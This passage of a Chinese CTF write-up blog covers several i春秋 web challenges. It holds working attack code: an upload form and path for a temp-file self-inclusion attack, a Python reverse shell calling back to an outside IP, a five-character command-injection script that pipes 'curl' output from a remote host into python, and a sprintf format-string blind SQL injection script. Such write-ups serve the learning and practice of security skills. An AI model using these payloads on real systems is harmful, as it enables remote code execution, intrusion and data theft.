+<h2 id="blog-进阶"><a href="#blog-进阶" class="headerlink" title="blog 进阶"></a>blog 进阶</h2><p>同blog一样，通过注入得到admin的密码，密码是<code>19-10-1997</code></p>
+<p>登陆进去，发现伪协议用不了了，这里学了一个操作，自包含</p>
+<p>当PHP使用<code>POST</code>方法上传文件时，会在<code>/tmp/</code>下生成临时文件</p>
+<blockquote>
+<p>文件被上传后，默认地会被储存到服务端的默认临时目录中，除非 php.ini 中的 upload_tmp_dir 设置为其它的路径。服务端的默认临时目录可以通过更改 PHP 运行环境的环境变量 TMPDIR 来重新设置，但是在 PHP 脚本内部通过运行 putenv() 函数来设置是不起作用的。该环境变量也可以用来确认其它的操作也是在上传的文件上进行的</p>
+<p>接受上传文件的 PHP 脚本为了决定接下来要对该文件进行哪些操作，应该实现任何逻辑上必要的检查。不管怎样，要么将该文件从临时目录中删除，要么将其移动到其它的地方。</p>
+<p>如果表单中没有选择上传的文件，则 PHP 变量 $_FILES[&#39;userfile&#39;][&#39;size&#39;]的值将为 0，$_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;]将为空。</p>
+<p>如果该文件没有被移动到其它地方也没有被改名，则该文件将在表单请求结束时被删除</p>
+</blockquote>
+<p>那么这里就有一个攻击思路，在文件被删除之前去包含它</p>
+<p>这里的操作就是通过自包含，让程序崩溃，临时文件得以保存</p>
+<p>利用代码如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"uploadform"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">action</span>=<span class="string">"http://eb1b3e576858427984ad8b66cfcf70f905501ae45aaa46b3.changame.ichunqiu.com/blog_manage/manager.php?module=manager&amp;name=php"</span>&gt;</span></span><br><span class="line">        uploadfile1:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file1"</span> <span class="attr">size</span>=<span class="string">"30"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>读源码的文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">'/var/www/html/flag.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个时候去查看tmp路径下的文件</p>
+<blockquote>
+<p>kindeditor/php/file_manager_json.php?path=../../../../../tmp/</p>
+</blockquote>
+<p>发现成功上传</p>
+<p><img src="/images/1558319631304.png" alt="1558319631304"></p>
+<p>包含一下</p>
+<blockquote>
+<p>/blog_manage/manager.php?module=../../../../tmp/phpwShwBa&amp;name=php</p>
+</blockquote>
+<p>居然没有回显，推测可能是禁了php，将<code>name=php</code>改成<code>name=txt</code>发现就可以回显了，很迷</p>
+<p>最终得到flag，然而辣鸡i春秋这题的提交崩了，点开就重新刷新，也没交上</p>
+<p><img src="/images/1558320121820.png" alt="1558320121820"></p>
+<h2 id="babyfirst-revenge-v1"><a href="#babyfirst-revenge-v1" class="headerlink" title="babyfirst-revenge v1"></a>babyfirst-revenge v1</h2><p>hitcon的神仙题，不得不说，做这种题真的长见识</p>
+<p>题目源码很简单，就是5个字符的命令执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里有几个点，首先是<code>ls -t</code>，按照修改时间顺序排列，我们可以通过写入多个文件，来拼接命令，然后把ls结果输出到文件，再使用sh来执行文件，例如</p>
+<p><img src="/images/1558604764959.png" alt="1558604764959"></p>
+<p>第二个问题就是，如何getshell，写一个是不显示的，这点在之前博客里已经写过了，我们可以通过<code>curl</code>命令来获取一个shell，<code>index.php</code>如下，虽然是个php，但实际上是python文件，ps：这里懒了直接偷的py反弹shell的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"144.202.82.213"</span>,<span class="number">7777</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>最终解题脚本如下(改的官方exp)，要注意不能以.开头，ls列不出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">'&gt;ls\\'</span>, </span><br><span class="line">    <span class="string">'ls&gt;_'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;-t\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line">    <span class="string">'ls&gt;&gt;_'</span>, </span><br><span class="line">    <span class="comment"># curl 60.205.218.9:2031|python</span></span><br><span class="line">    <span class="string">'&gt;on'</span>, </span><br><span class="line">    <span class="string">'&gt;th\\'</span>, </span><br><span class="line">    <span class="string">'&gt;py\\'</span>,</span><br><span class="line">    <span class="string">'&gt;1\|\\'</span>,</span><br><span class="line">    <span class="string">'&gt;03\\'</span>,</span><br><span class="line">    <span class="string">'&gt;:2\\'</span>,</span><br><span class="line">    <span class="string">'&gt;9\\'</span>,</span><br><span class="line">    <span class="string">'&gt;8.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;21\\'</span>,</span><br><span class="line">    <span class="string">'&gt;5.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;20\\'</span>, </span><br><span class="line">    <span class="string">'&gt;0.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;6\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;rl\\'</span>, </span><br><span class="line">    <span class="string">'&gt;cu\\'</span>, </span><br><span class="line">    <span class="comment"># exec</span></span><br><span class="line">    <span class="string">'sh _'</span>, </span><br><span class="line">    <span class="string">'sh g'</span>, </span><br><span class="line">]</span><br><span class="line">r = requests.get(<span class="string">'http://117.50.3.97:8001/?reset=1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">5</span> </span><br><span class="line">    r = requests.get(<span class="string">'http://117.50.3.97:8001/?cmd='</span> + quote(i) )</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在服务器上就可以收到弹来的shell，最终flag在mysql里</p>
+<p><img src="/images/1558605180682.png" alt="1558605180682"></p>
+<h2 id="SQLi-迎圣诞"><a href="#SQLi-迎圣诞" class="headerlink" title="SQLi 迎圣诞"></a>SQLi 迎圣诞</h2><p>有一个登录框，随便测一下，发现有<code>username error</code> 和 <code>password error</code> 两种不同的回显，推测很有可能是布尔盲注，fuzz一下过滤了什么，发现这个报错很有意思</p>
+<p><img src="/images/1560934742848.png" alt="1560934742848"></p>
+<p>由此可以确定这道题的漏洞就在sprintf格式化字符串漏洞</p>
+<p>首先了解一下sprintf</p>
+<p><img src="/images/1560935544725.png" alt="1560935544725"></p>
+<blockquote>
+<p>如果 % 符号多于 arg 参数，则必须使用占位符。占位符位于 % 符号之后，由数字和 “$“ 组成</p>
+<p>而在php的源码中，只匹配了15种类型，其他字符类型都直接break了，php未做任何处理，直接跳过，所以导致了这个问题：</p>
+<p>没做字符类型检测的最大危害就是它可以吃掉一个转义符, 如果%后面出现一个,那么php会把\当作一个格式化字符的类型而吃掉, 最后%\（或%1$\）被替换为空</p>
+<p>因此sprintf注入，或者说php格式化字符串注入的原理为：</p>
+<p>要明白%后的一个字符(除了%，%上面表格已经给出了)都会被当作字符型类型而被吃掉，也就是被当作一个类型进行匹配后面的变量，比如%c匹配asciii码，%d匹配整数，如果不在定义的也会匹配，匹配空，比如%\，这样我们的目的只有一个，使得单引号逃逸，也就是能够起到闭合的作用。</p>
+</blockquote>
+<p>所以这里推测后端代码大致顺序应该如下所示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">'\\\''</span>;</span><br><span class="line">$p=<span class="string">"admin%1$\' or 1=1 #"</span>;</span><br><span class="line">$input = addslashes($p); <span class="comment">//先对我们的输入进行addslashes操作，此时\和'都被添加了\</span></span><br><span class="line">$b = sprintf (<span class="string">"AND b='%s'"</span>, $input );</span><br><span class="line">$sql = sprintf(<span class="string">"SELECT * FROM t WHERE a='%s' $b "</span>, <span class="string">'admin'</span> ); <span class="comment">// 之后进行sprintf操作</span></span><br><span class="line">var_dump($b);</span><br><span class="line">var_dump($sql);</span><br></pre></td></tr></table></figure>
+
+<p>以上代码执行的结果如下</p>
+<p><img src="/images/1560950350997.png" alt="1560950350997"></p>
+<p>可以看到 <code>\\\&#39;</code> 变成了<code>\\&#39;</code> 成功逃逸出一个单引号与之前闭合</p>
+<p>当逃逸出单引号之后这道题就变成了比较常规的布尔盲注了</p>
+<p>payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://b47297251f7540ae9c5676dc7d05a2b48d324114972e446c.changame.ichunqiu.com/index.php"</span></span><br><span class="line"></span><br><span class="line">temp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">64</span>):</span><br><span class="line">    print(<span class="string">"round:"</span>+str(i))</span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;=high):</span><br><span class="line">        mid = (low+high)/<span class="number">2</span></span><br><span class="line">        table = <span class="string">"select group_concat(table_name) from information_schema.tables where table_schema=database()"</span> <span class="comment">#flag</span></span><br><span class="line">        column = <span class="string">"select group_concat(column_name) from information_schema.columns where table_name=0x666c6167"</span> <span class="comment">#flag，为了避免单引号，这里采用16进制编码</span></span><br><span class="line">        flag = <span class="string">"select group_concat(flag) from ctf.flag"</span></span><br><span class="line">        payload = <span class="string">"admin%1$\\' or (ascii(substr(("</span>+flag+<span class="string">"),"</span>+str(i)+<span class="string">",1)))&gt;"</span>+str(mid)+<span class="string">"#"</span> <span class="comment">#flag&#123;b5b36121-86dd-a4db-aab3-86ddb749dfa1&#125;</span></span><br><span class="line">        data = &#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="string">'aa'</span>&#125;</span><br><span class="line">        result = requests.post(url, data=data)</span><br><span class="line">        <span class="comment">#print(result.text)</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"password error"</span> <span class="keyword">in</span> result.text):</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid<span class="number">-1</span></span><br><span class="line">        </span><br><span class="line">    temp = temp + chr(int(round((low+high+<span class="number">1</span>)/<span class="number">2</span>)))</span><br><span class="line">    print(temp.ljust(<span class="number">50</span>, <span class="string">'*'</span>))</span><br></pre></td></tr></table></figure>
+
+<h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h2><p>flag{82efc37f1cd5d4636ea7cadcd5a814a2}</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    Moyu
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="http://yoursite.com/2019/07/07/ichunqiu/" title>http://yoursite.com/2019/07/07/ichunqiu/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/04/操作系统/" rel="next" title="操作系统">
+                <i class="fa fa-chevron-left"></i> 操作系统
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/wlp.jpg" alt="Moyu">
+            
+              <p class="site-author-name" itemprop="name">Moyu</p>
+              <p class="site-description motion-element" itemprop="description">hack for fun</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#爆破-1"><span class="nav-number">1.</span> <span class="nav-text">爆破-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爆破-2"><span class="nav-number">2.</span> <span class="nav-text">爆破-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爆破-3"><span class="nav-number">3.</span> <span class="nav-text">爆破-3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Upload"><span class="nav-number">4.</span> <span class="nav-text">Upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#code"><span class="nav-number">5.</span> <span class="nav-text">code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#YeserCMS"><span class="nav-number">6.</span> <span class="nav-text">YeserCMS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS平台"><span class="nav-number">7.</span> <span class="nav-text">XSS平台</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#再见CMS"><span class="nav-number">8.</span> <span class="nav-text">再见CMS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL"><span class="nav-number">9.</span> <span class="nav-text">SQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLi"><span class="nav-number">10.</span> <span class="nav-text">SQLi</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#123"><span class="nav-number">11.</span> <span class="nav-text">123</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#test"><span class="nav-number">12.</span> <span class="nav-text">test</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#login"><span class="nav-number">13.</span> <span class="nav-text">login</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#登陆"><span class="nav-number">14.</span> <span class="nav-text">登陆</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gift"><span class="nav-number">15.</span> <span class="nav-text">gift</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Try"><span class="nav-number">16.</span> <span class="nav-text">Try</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fuzzing"><span class="nav-number">17.</span> <span class="nav-text">Fuzzing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fuzz"><span class="nav-number">18.</span> <span class="nav-text">Fuzz</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#blog"><span class="nav-number">19.</span> <span class="nav-text">blog</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#blog-进阶"><span class="nav-number">20.</span> <span class="nav-text">blog 进阶</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyfirst-revenge-v1"><span class="nav-number">21.</span> <span class="nav-text">babyfirst-revenge v1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLi-迎圣诞"><span class="nav-number">22.</span> <span class="nav-text">SQLi 迎圣诞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hello-world"><span class="nav-number">23.</span> <span class="nav-text">hello world</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Moyu</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
